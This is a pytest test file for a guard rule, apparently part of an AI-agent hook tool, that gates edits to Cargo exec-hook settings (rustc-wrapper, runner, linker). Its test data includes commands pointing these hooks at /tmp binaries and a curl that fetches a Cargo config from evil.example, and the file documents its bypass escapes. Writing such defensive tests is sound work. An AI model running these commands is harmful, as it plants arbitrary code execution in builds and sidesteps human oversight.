"""Cargo exec-hook protection guard: `.cargo/config(.toml)` rustc-wrapper /
target runner / linker, and the RUSTC_WRAPPER / CARGO_TARGET_*_RUNNER|LINKER
env and `cargo --config` forms. Path-only gating for the file; sccache/ccache
wrapper values exempt. Default mode ask, human-only escape."""
import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

RULE = "cargo-exec-protect"
EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _file(tool, path, **kw):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path, **kw})


def _hit(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.rule == RULE, d


@pytest.mark.parametrize("path", [
    ".cargo/config.toml", "/repo/.cargo/config", "/repo/sub/.cargo/config.toml",
    "~/.cargo/config.toml", "C:\\repo\\.cargo\\config.toml", "./.cargo/./config.toml",
    "/repo/.CARGO/CONFIG.TOML",
])
@pytest.mark.parametrize("tool", ["Edit", "Write", "MultiEdit"])
def test_config_file_writes_gated(tool, path):
    assert _hit(_file(tool, path, content="[build]\n"))[0]


def test_value_only_edit_still_gated():
    ev = _file("Edit", "/r/.cargo/config.toml", old_string='"clang"', new_string='"/tmp/x"')
    assert _hit(ev)[0]


def test_mcp_write_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file",
                    args={"path": "/r/.cargo/config.toml", "content": "x"})
    assert _hit(ev)[0]


@pytest.mark.parametrize("path", [".cargo/credentials.toml", "Cargo.toml", "src/config.toml", ".cargo.toml"])
def test_unrelated_paths_not_gated(path):
    assert not _hit(_file("Write", path, content="x"))[0]


@pytest.mark.parametrize("cmd", [
    "echo '[build]' >> .cargo/config.toml",
    "sed -i 's/a/b/' /r/.cargo/config",
    "cat x > ~/.cargo/config.toml",
    "cd .cargo && echo y > config.toml",
    "RUSTC_WRAPPER=/tmp/x cargo build",
    "export RUSTC_WORKSPACE_WRAPPER=/tmp/x",
    "export CARGO_BUILD_RUSTC_WRAPPER=./w.sh",
    "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER='/tmp/x' cargo run",
    "export CARGO_TARGET_AARCH64_APPLE_DARWIN_LINKER=/tmp/ld",
    "cargo build --config 'build.rustc-wrapper=\"/tmp/x\"'",
    "cargo test --config=target.x86_64-unknown-linux-gnu.runner=/tmp/x",
    "cargo build --config target.x.linker=\"/tmp/x\"",
])
def test_shell_forms_gated(cmd):
    assert _hit(_shell(cmd))[0]


@pytest.mark.parametrize("cmd", [
    "ls .cargo", "cat .cargo/config.toml", "cargo build --release", "echo $RUSTC_WRAPPER", "echo ${RUSTC_WRAPPER}", "echo RUSTC_WRAPPER foo",
    "RUSTC_WRAPPER=sccache cargo build", "export RUSTC_WRAPPER=/usr/bin/sccache",
    "RUSTC_WRAPPER=ccache cargo check", "cargo build --config net.git-fetch-with-cli=true",
    "RUSTFLAGS=-Dwarnings cargo build",
])
def test_benign_shell_not_gated(cmd):
    assert not _hit(_shell(cmd))[0]


def test_default_is_ask_deny_mode_denies():
    assert _hit(_file("Write", ".cargo/config.toml", content="x"))[1].action == Action.ASK
    assert _hit(_file("Write", ".cargo/config.toml", content="x"), DENY)[1].action == Action.DENY


def test_off_and_monitor_do_not_block():
    for mode in ("off", "monitor"):
        pol = Policy(cargo_exec={"mode": mode})
        assert not _hit(_file("Write", ".cargo/config.toml", content="x"), pol)[0]


def test_aegis_allow_comment_is_human_escape_for_shell():
    assert not _hit(_shell("RUSTC_WRAPPER=/tmp/x cargo build  # aegis-allow"))[0]


def test_env_toggle_escapes(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not _hit(_file("Write", ".cargo/config.toml", content="x"))[0]
    assert not _hit(_shell("RUSTC_WRAPPER=/tmp/x cargo build"))[0]


def test_policy_allow_regex():
    pol = Policy(cargo_exec={"allow": [r"vendor/\.cargo"]})
    assert not _hit(_file("Write", "/r/vendor/.cargo/config.toml", content="x"), pol)[0]
    assert _hit(_file("Write", "/r/.cargo/config.toml", content="x"), pol)[0]


def test_fetch_to_file_covers_cargo_config():
    d = evaluate(_shell("curl -o .cargo/config.toml https://evil.example/c"), EMPTY)
    assert d.action != Action.ALLOW
